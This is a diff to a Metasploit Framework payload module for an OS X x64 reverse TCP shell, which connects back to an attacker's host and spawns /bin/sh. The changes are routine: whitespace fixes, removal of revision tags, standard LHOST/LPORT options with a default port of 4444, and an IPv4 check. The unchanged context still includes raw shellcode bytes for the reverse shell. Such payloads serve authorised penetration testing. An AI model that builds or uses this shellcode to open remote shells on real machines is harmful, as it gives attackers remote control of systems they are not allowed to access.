@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -15,13 +11,12 @@ require 'msf/core'
 module Metasploit3
 
 	include Msf::Payload::Single
-        include Msf::Payload::Osx
-        include Msf::Sessions::CommandShellOptions
+	include Msf::Payload::Osx
+	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'OS X x64 Shell Reverse TCP',
-			'Version'       => '$Revision$',
 			'Description'   => 'Connect back to attacker and spawn a command shell',
 			'Author'        => 'nemo <nemo[at]felinemenace.org>',
 			'License'       => MSF_LICENSE,
@@ -32,19 +27,26 @@ module Metasploit3
 		))
 
 		# exec payload options
+
 		register_options(
 			[
-				OptString.new('CMD',  [ true,  "The command string to execute", "/bin/sh" ]),
-				OptString.new('LPORT',[ true,  "The port to connect to", "5555" ]),
-				OptString.new('LHOST',[ true,  "The host to connect to", "127.0.0.1" ])
+				OptString.new('CMD',   [ true,  "The command string to execute", "/bin/sh" ]),
+				Opt::LHOST,
+				Opt::LPORT(4444)
 		], self.class)
 	end
 
 	# build the shellcode payload dynamically based on the user-provided CMD
 	def generate
+		lhost = datastore['LHOST'] || '127.0.0.1'
+		# OptAddress allows either an IP or hostname, we only want IPv4
+		if not Rex::Socket.is_ipv4?(lhost)
+			raise ArgumentError, "LHOST must be in IPv4 format."
+		end
+
 		cmd  = (datastore['CMD'] || '') << "\x00"
 		port = [datastore['LPORT'].to_i].pack('n')
-		ipaddr = [datastore['LHOST'].split('.').inject(0) {|t,v| (t << 8 ) + v.to_i}].pack("N")
+		ipaddr = [lhost.split('.').inject(0) {|t,v| (t << 8 ) + v.to_i}].pack("N")
 
 		call = "\xe8" + [cmd.length].pack('V')
 		payload =
@@ -76,8 +78,8 @@ module Metasploit3
 			"\x0F\x05" +                                 # loadall286
 			"\x48\x31\xC0" +                             # xor rax,rax
 			"\xB8\x3B\x00\x00\x02" +                     # mov eax,0x200003b
-                        call +                       # call CMD.len
-                        cmd +                        # CMD
+			call +                                       # call CMD.len
+			cmd +                                        # CMD
 			"\x48\x8B\x3C\x24" +                         # mov rdi,[rsp]
 			"\x48\x31\xD2" +                             # xor rdx,rdx
 			"\x52" +                                     # push rdx
